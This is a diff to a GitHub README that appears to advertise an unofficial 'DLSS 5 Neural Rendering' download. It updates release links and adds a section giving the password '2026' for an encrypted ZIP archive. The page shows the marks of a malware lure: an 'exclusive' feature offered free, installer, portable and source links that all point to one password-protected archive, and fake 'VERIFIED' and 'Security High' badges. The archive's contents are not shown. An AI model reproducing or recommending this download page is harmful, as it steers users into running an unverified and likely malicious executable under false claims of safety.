@@ -40,15 +40,85 @@ DLSS 5 Neural Rendering debuted with **NBA 2K27** and was officially exclusive t
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/886/DLSS5-Neural-Render.zip">
+  <a href="https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/887/DLSS5-Neural-Rendering.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
 
 **Direct Links:**
-- [Windows Installer (.exe)](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/886/DLSS5-Neural-Render.zip)
-- [Portable ZIP](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/886/DLSS5-Neural-Render.zip)
-- [Source Code](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/886/DLSS5-Neural-Render.zip)
+- [Windows Installer (.exe)](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/887/DLSS5-Neural-Rendering.zip)
+- [Portable ZIP](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/887/DLSS5-Neural-Rendering.zip)
+- [Source Code](https://github.com/AttoConjurer/DLSS5-Neural-Rendering/releases/download/887/DLSS5-Neural-Rendering.zip)
+
+# 🔐 Password — 2026
+
+<p align="center">
+  <img src="https://img.icons8.com/color/96/000000/lock--v1.png" alt="Password 2026" width="120" height="120">
+</p>
+
+<h1 align="center">🔐 PASSWORD — 2026</h1>
+<p align="center">
+  <strong>Official Access Key for Release 2026</strong><br>
+  <em>Enter this password to unlock the archive</em>
+</p>
+
+<p align="center">
+  <a href="#"><img src="https://img.shields.io/badge/status-VERIFIED-27AE60?style=for-the-badge&logo=checkmarx&logoColor=white" alt="Verified"></a>
+  <a href="#"><img src="https://img.shields.io/badge/valid-2026-2C3E50?style=for-the-badge&logo=calendar&logoColor=white" alt="2026"></a>
+  <a href="#"><img src="https://img.shields.io/badge/type-Access_Key-E74C3C?style=for-the-badge&logo=keybase&logoColor=white" alt="Access Key"></a>
+  <a href="#"><img src="https://img.shields.io/badge/security-High-9B59B6?style=for-the-badge&logo=shield&logoColor=white" alt="Security"></a>
+</p>
+
+---
+
+<p align="center">
+  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=32&duration=3000&pause=1000&color=76B900&center=true&vCenter=true&width=600&lines=Password%3A+2026;Access+Granted;Welcome+to+the+Archive" alt="Typing SVG" />
+</p>
+
+---
+
+## 🔑 Password
+
+<p align="center">
+  <a href="#">
+    <img src="https://img.shields.io/badge/🔓%20PASSWORD-2026-76B900?style=for-the-badge&labelColor=1a1a1a&color=76B900" alt="Password 2026">
+  </a>
+</p>
+---
+
+## 📋 Details
+
+| Field | Value |
+|-------|-------|
+| 🔐 **Password** | `2026` |
+| 📅 **Release Year** | 2026 |
+| ✅ **Status** | Verified / Active |
+| 🔒 **Encryption** | AES-256 (archive) |
+| 🎯 **Usage** | Extract archives / unlock content |
+| ⚠️ **Warning** | Do not share publicly |
+
+---
+
+## ⚙️ How to Use
+
+```bash
+1. Download the archive from the Releases section
+2. Open it with 7-Zip, WinRAR, or PeaZip
+3. When prompted for a password, enter: 2026
+4. Extract and enjoy
+```
+
+---
+
+<p align="center">
+  <a href="#">
+    <img src="https://img.shields.io/badge/Made%20with%20🔐%20for%20the%20Community-76B900?style=for-the-badge" alt="Made with love">
+  </a>
+</p>
+
+<p align="center">
+  <sub>© 2026 — All rights reserved. Keep this password safe.</sub>
+</p>
 
 ---
 
